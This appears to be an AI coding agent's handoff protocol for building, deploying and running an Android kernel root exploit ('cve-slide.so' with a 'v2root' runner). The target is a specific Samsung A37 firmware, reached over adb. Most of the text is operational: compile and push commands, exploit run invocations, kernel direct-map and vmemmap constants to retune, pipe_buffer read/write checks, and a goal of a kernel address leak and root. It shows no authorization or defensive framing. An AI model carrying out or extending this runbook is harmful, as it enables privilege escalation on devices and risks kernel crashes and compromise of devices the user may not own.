# BUILD STATE AND NEXT SESSION PROTOCOL

---

## 1. Current Build State

### 1.1 Environment
- **NDK Location**: `/tmp/opencode/ndk/toolchains/llvm/prebuilt/linux-x86_64/bin/`
- **Compiler**: `aarch64-linux-android35-clang`
- **Target Architecture**: aarch64 (ARM64)
- **Output**: `/tmp/cve-slide.so` (renamed to `a37-final.so`)

### 1.2 Build Command
```bash
export ANDROID_NDK_HOME=/tmp/opencode/ndk
CC=/tmp/opencode/ndk/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang

$CC -DAPP_PAYLOAD=1 \
    -fPIC \
    -O2 \
    -g \
    -Isrc \
    -DTARGET_HEADER='"targets/a37xv2-A376BXXU1AZB7/target.h"' \
    src/main.c \
    src/util.c \
    src/slide_app.c \
    src/fops.c \
    src/pipe.c \
    src/root.c \
    src/preload.c \
    -shared \
    -pthread \
    -o /tmp/cve-slide.so
```

### 1.3 Last Build
- **Time**: 2026-08-27 (during audit)
- **Status**: ✅ Success, no warnings
- **Output size**: ~100KB
- **Location**: `/tmp/cve-slide.so`

### 1.4 Note
- **Code NOT yet modified** - Current build uses old wrong constants
- Need to rebuild after modifying target.h

---

## 2. Deployment Commands

### 2.1 Push to Device
```bash
adb -s 127.0.0.1:5555 push /tmp/cve-slide.so /data/local/tmp/a37-final.so
adb -s 127.0.0.1:5555 push /tmp/opencode/RMGP/v2root /data/local/tmp/v2root
adb -s 127.0.0.1:5555 shell chmod 755 /data/local/tmp/v2root
```

### 2.2 Run Command (Not Executing, Just Recording)
```bash
# Full run command
adb -s 127.0.0.1:5555 shell "
  cd /data/local/tmp && \
  env SLIDE_SOURCE=tracefs \
      EXPLOIT_ATTEMPTS=1 \
      P0_ATTEMPT_TIMEOUT_SEC=400 \
      EXPLOIT_ATTEMPT_TIMEOUT_SEC=1500 \
  ./v2root --run-payload \
    ./a37-final.so \
    ./v2root \
    /data/local/tmp/log.txt
"
```

### 2.3 Read-Only Verification Commands (Safe)
```bash
# Verify file exists
adb -s 127.0.0.1:5555 shell ls -la /data/local/tmp/a37-final.so

# Verify device info
adb -s 127.0.0.1:5555 shell cat /proc/meminfo | head -5
adb -s 127.0.0.1:5555 shell cat /proc/iomem | head -10
```

---

## 3. Next Session Protocol (Execute in Order)

### 3.1 Phase 0: Device Verification (Read-Only, Safe)
**Goal**: Confirm RAM size and physical layout

```bash
# 1. Check RAM size
adb -s 127.0.0.1:5555 shell cat /proc/meminfo | head -5

# 2. Check physical memory layout
adb -s 127.0.0.1:5555 shell cat /proc/iomem | head -10

# 3. Check vmalloc addresses (indirect VA layout verification)
adb -s 127.0.0.1:5555 shell head -5 /proc/vmallocinfo 2>/dev/null || echo "needs root"

# 4. Check kernel symbol addresses (may need root)
adb -s 127.0.0.1:5555 shell cat /proc/kallsyms 2>/dev/null | head -10 || echo "needs root"
```

**Expected Results**:
- RAM should show ~12GB (MemTotal ≈ 12582912 kB)
- System RAM range should start at 0x80000000
- vmalloc addresses should be above `0xffffff80...` region

### 3.2 Phase 1: Modify Code
**Goal**: Update constants in target.h

Lines to modify:
```c
// target.h L40
#define P0_PAGE_OFFSET 0xffffff8000000000ULL  // was: 0xffffffc000000000ULL

// target.h L108-111
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL  // was: 0xffffffc000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff8300000000ULL    // was: 0xffffffc200000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL              // was: 0xffffffc000000000ULL
#define DIRECT_MAP_END 0xffffff8300000000ULL                // was: 0xffffffc200000000ULL

// target.h L112 - pending device verification
#define VMEMMAP_START 0xfffffffc00000000ULL  // was: 0xffffffe400000000ULL
```

### 3.3 Phase 2: Rebuild
**Goal**: Generate new a37-final.so

```bash
# Clean old build
rm -f /tmp/cve-slide.so /tmp/a37-final.so

# Build new version
$CC -DAPP_PAYLOAD=1 -fPIC -O2 -g -Isrc \
    -DTARGET_HEADER='"targets/a37xv2-A376BXXU1AZB7/target.h"' \
    src/main.c src/util.c src/slide_app.c src/fops.c src/pipe.c src/root.c src/preload.c \
    -shared -pthread -o /tmp/cve-slide.so

# Copy as a37-final.so
cp /tmp/cve-slide.so /tmp/a37-final.so

# Verify build
ls -la /tmp/a37-final.so
file /tmp/a37-final.so
```

### 3.4 Phase 3: Deploy
**Goal**: Push to device

```bash
adb -s 127.0.0.1:5555 push /tmp/a37-final.so /data/local/tmp/a37-final.so
adb -s 127.0.0.1:5555 shell ls -la /data/local/tmp/a37-final.so
```

### 3.5 Phase 4: Minimal Test
**Goal**: Verify exploit can start without crashing

```bash
# Test with minimal configuration
adb -s 127.0.0.1:5555 shell "
  cd /data/local/tmp && \
  env SLIDE_SOURCE=tracefs \
      EXPLOIT_ATTEMPTS=1 \
      P0_ATTEMPT_TIMEOUT_SEC=100 \
      EXPLOIT_ATTEMPT_TIMEOUT_SEC=300 \
  ./v2root --run-payload \
    ./a37-final.so \
    ./v2root \
    /data/local/tmp/test-log.txt
"

# Check log
adb -s 127.0.0.1:5555 shell cat /data/local/tmp/test-log.txt
```

### 3.6 Phase 5: Analyze Results
**Goal**: Determine if further adjustment needed

Check log for key information:
- `pipe_scan_vmemmap`: should be > 0 (found valid pipe_buffer)
- `phys step pipe probe found`: should be 1
- `phys step probed read done ok`: should be 1
- `mm leaked=`: if present, record address and obj_idx

---

## 4. Troubleshooting

### 4.1 If find_pipe_buffer Fails
**Symptom**: `pipe_scan_vmemmap=0`

**Possible Causes**:
1. VMEMMAP_START value wrong
2. RAM size not 12GB
3. memstart_addr not 0x80000000

**Debug Steps**:
```bash
# Add debug print in pipe.c to show actual pb.page values
pr_info("DEBUG: pb.page=%016llx VMEMMAP_START=%016llx VMEMMAP_END=%016llx\n",
        (unsigned long long)pb.page,
        (unsigned long long)VMEMMAP_START,
        (unsigned long long)VMEMMAP_END);
```

### 4.2 If Direct Map Calculation Wrong
**Symptom**: `is_direct_ptr` returns wrong

**Possible Causes**:
1. DIRECT_MAP_BASE/END wrong
2. PAGE_OFFSET not 0xffffff8000000000

**Debug Steps**:
```bash
# Add debug print in util.c to show is_direct_ptr input/output
pr_info("DEBUG: is_direct_ptr(%016llx) = %d\n",
        (unsigned long long)value, result);
```

### 4.3 If Kernel Panic
**Symptom**: Device reboots

**Possible Causes**:
1. Wrote to wrong kernel address
2. Constant calculation error causing out-of-bounds

**Mitigation**:
1. Stop testing immediately
2. Review modified constants
3. Use more conservative test configuration

---

## 5. Rollback Plan

If modifications cause issues, rollback:

```bash
# 1. Restore target.h
cd /tmp/opencode/RMGP
git checkout src/targets/a37xv2-A376BXXU1AZB7/target.h

# 2. Rebuild
$CC -DAPP_PAYLOAD=1 -fPIC -O2 -g -Isrc \
    -DTARGET_HEADER='"targets/a37xv2-A376BXXU1AZB7/target.h"' \
    src/main.c src/util.c src/slide_app.c src/fops.c src/pipe.c src/root.c src/preload.c \
    -shared -pthread -o /tmp/cve-slide.so

# 3. Redeploy
adb -s 127.0.0.1:5555 push /tmp/cve-slide.so /data/local/tmp/a37-final.so
```

---

## 6. Success Criteria

### 6.1 Minimum Success
- [ ] Compilation without warnings
- [ ] Device loading without errors
- [ ] `find_pipe_buffer` finds at least 1 valid pipe_buffer
- [ ] Device does not crash

### 6.2 Full Success
- [ ] All minimum success criteria
- [ ] `pipe_phys_read` and `pipe_phys_write` succeed
- [ ] Kernel address leak (mm leaked=...)
- [ ] Final root privilege obtained

---

*Document created: 2026-08-27*
*Status: Complete build and next session protocol*
